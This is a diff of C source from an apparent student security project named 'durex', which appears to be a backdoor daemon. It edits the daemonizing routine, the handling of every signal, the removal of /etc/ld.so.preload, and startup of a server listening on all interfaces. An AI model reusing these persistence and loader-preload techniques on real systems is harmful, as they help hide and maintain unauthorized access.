@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2019/07/15 21:17:57 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/08/04 05:11:59 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -35,39 +35,32 @@ static void			clearStructure()
 	mymemset(&e.server.fdr, 0, sizeof(e.server.fdr));
 	mymemset(&e.server.fdw, 0, sizeof(e.server.fdw));
 	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
+	{
 		clearClient(&e.server.client[i]);
-}
-
-static int			createDaemon()
-{
-	int				fd;
-	pid_t			pid;
-
-	pid = fork();
-	if (pid == 0) {
-		if (setsid() < 0)
-			exit(1);
-		pid = fork();
-		if (pid == 0) {
-			fd = 0;
-			while (fd < _NSIG)
-				signal(fd++, &durexSigterm);
-			fd = open("/dev/null", O_RDWR);
-			if (fd < 0)
-				exit(1);
-			dup2(fd, STDIN_FILENO);
-			dup2(fd, STDOUT_FILENO);
-			dup2(fd, STDERR_FILENO);
-			close(fd);
-			umask(0);
-			if (chdir("/") < 0)
-				exit(1);
-			return 1;
-		}
-		exit(0);
+		e.server.client[i].id = i + 1;
 	}
-	return 0;
 }
+
+// static int			createDaemon()
+// {
+// 	int				fd;
+// 	pid_t			pid;
+
+// 	pid = fork();
+// 	if (pid == 0) {
+// 		if (setsid() < 0)
+// 			exit(1);
+// 		pid = fork();
+// 		if (pid == 0) {
+// 			fd = 0;
+// 			while (fd < _NSIG)
+// 				signal(fd++, &durexSigHandler);
+// 			return 1;
+// 		}
+// 		exit(0);
+// 	}
+// 	return 0;
+// }
 
 static int			launch_program()
 {
@@ -75,7 +68,7 @@ static int			launch_program()
 	char			buf[20];
 	int				ret;
 
-	unlink("/etc/ld.so.preload");
+	unlink(DUREX_PRELOAD);
 	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_RDWR, 0600);
 	if (e.lock < 0)
 		return 0;
@@ -144,9 +137,14 @@ void				durex()
 	struct timeval	timeout;
 
 	clearStructure();
-	if (createDaemon() && launch_program() && hireReporter() && create_library() && openServer("0.0.0.0", SERVER_PORT)) {
-		serverLog(1, "[LOGS] - Server online\n");
+	if (launch_program() && hireReporter() && create_library() && openServer("0.0.0.0", SERVER_PORT))
+	{
+		e.server.uptime = time(NULL);
+		serverLog(2, "[LOGS] - Server online\n");
 		mymemset(&timeout, 0, sizeof(timeout));
+		ret = 0;
+		while (ret < _NSIG)
+			signal(ret++, &durexSigHandler);
 		while (1)
 		{
 			maxfd = setupSelect();
@@ -172,9 +170,8 @@ void				durex()
 		serverLog(1, "[FATAL] - Weird... \n");
 		quitClearlyServer();
 		quitClearlyDaemon();
-		exit(0);
 	}
-	print_usr_name();
+	write(STDOUT_FILENO, DUREX_USERS, sizeof(DUREX_USERS));
 }
 
 void			quitClearlyDaemon()
